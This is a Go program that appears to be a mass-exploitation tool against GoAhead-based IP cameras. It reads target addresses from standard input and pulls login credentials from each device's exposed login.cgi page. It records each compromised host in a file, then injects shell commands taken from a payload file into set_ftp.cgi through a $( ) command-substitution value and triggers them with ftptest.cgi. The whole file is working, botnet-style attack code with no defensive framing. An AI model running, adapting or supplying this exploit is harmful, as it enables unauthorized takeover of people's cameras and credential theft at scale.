package main

import
(
    "net"
    "fmt"
//    "io/ioutil"
    "os"
    "strings"
    "time"
    "bufio"
    "errors"
    "sync"
    "strconv"
)

var group sync.WaitGroup

func retrieve_credentials(host string) (string, string, error) {
    conn, err := net.DialTimeout("tcp", host, time.Duration(10) * time.Second)
    if err != nil {
        return "", "", err
    }
    defer conn.Close()
    conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
    _, err = conn.Write([]byte("GET login.cgi HTTP/1.1\r\n\r\n"))
    if err != nil {
        return "", "", err
    }
    buf := make([]byte, 1024)
    conn.SetReadDeadline(time.Now().Add(10 * time.Second))
    for {
        _, err = conn.Read(buf)
        if err != nil {
            break
        }
    }
    if !strings.Contains(string(buf), "var login") {
        return "", "", errors.New("invalid")
    }
    // Parse the credentials
    ind := strings.Index(string(buf), "var login")
    done := buf[ind:]
    done2 := strings.Trim(string(done), "\r\n")
    split := strings.Split(done2, " ")
    if len(split) <= 1 {
        return "", "", errors.New(fmt.Sprintf("Failed to split the credentials\n"))
    }
    preuser := split[1]
    prepass := split[2]
    preuser = strings.Trim(preuser, "var \r\n")
    prepass = strings.Trim(prepass, "var \r\n")
    if len(preuser) > 11 {
    	if len(prepass) > 11 {
			username := preuser[11:]
			password := prepass[11:]
			username = strings.Trim(username, "\";")
			password = strings.Trim(password, "\";")
			return username, password, nil
	    }
    }
    return "", "", errors.New(fmt.Sprintf("Failed to split the credentials\n"))
}

func submit_payload(host string, payload string) (bool) {
    conn, err := net.DialTimeout("tcp", host, time.Duration(10) * time.Second)
    if err != nil {
        return false
    }
    defer conn.Close()
    conn.SetDeadline(time.Now().Add(30 * time.Second))
    _, err = conn.Write([]byte(fmt.Sprintf("%s", payload)))
    if err != nil {
        return false
    }
    return true
}

func submit_payload_wait(host string, payload string) (bool) {
    conn, err := net.DialTimeout("tcp", host, time.Duration(10) * time.Second)
    if err != nil {
        return false
    }
    defer conn.Close()
    conn.SetDeadline(time.Now().Add(60 * time.Second))
    _, err = conn.Write([]byte(fmt.Sprintf("%s", payload)))
    if err != nil {
        return false
    }
    buf := make([]byte, 1024)
    for {
        _, err := conn.Read(buf)
        if err != nil {
            break
        }
        if len(buf) > 1 {
            if strings.Contains(string(buf), "ok") {
                return true
            }
        }
    }
    return false
}

func run(host string) {
    target := ""
    port := 81
    
    tmp_host := strings.Split(host, ":")[0]
    if len(strings.Split(host, ":")) > 1 {
        port, _ = strconv.Atoi(strings.Split(host, ":")[1])
    }
    
    target = fmt.Sprintf("%s:%d", tmp_host, port)
    
    username, password, err := retrieve_credentials(target)
    if err != nil {
        fmt.Println(err)
        return
    }
    fmt.Printf("(GoAhead) found credentials: (%s:%s:%s)\n", username, password, target)
	
	fo, err := os.OpenFile("cctv.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		panic(err)
	}
	defer fo.Close()
	s := fmt.Sprintf("%s\n", target)
	_, err = fo.WriteString(s)
	if err != nil {
		panic(err)
	}
	
    f, err := os.Open("payload_file")
    if err != nil {
        fmt.Println(err)
        return
    }
    defer f.Close()
    r := bufio.NewReader(f)
    scan := bufio.NewScanner(r)
    for scan.Scan() {
        //fmt.Printf("Sending %s\n", scan.Text())
        ret := submit_payload(target, "GET /set_ftp.cgi?loginuse=" + username + "&loginpas=" + password + "&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28" + scan.Text() + "%29 HTTP/1.1\n\n")
        if !ret {
            //fmt.Printf("(GoAhead) failed to send payload: %s\n", target)
        }
        //fmt.Printf("(GoAhead) sending payload to: %s\n", target)
        ret2 := submit_payload_wait(target, "GET /ftptest.cgi?loginuse=" + username + "&loginpas=" + password + " HTTP/1.1\n\n")
        if !ret2 {
            //fmt.Printf("(GoAhead) failed to send payload: %s\n", target)
        }
    }
    return
}

func main() {
        r := bufio.NewReader(os.Stdin)
        scan := bufio.NewScanner(r)
        for scan.Scan() {
            targ := scan.Text()
            //fmt.Printf("Received - %s\n", targ)
            go run(targ)
			time.Sleep(100 * time.Nanosecond)
        }
        fmt.Printf("Finished!\r\n")
        time.Sleep(30 * time.Second)
}
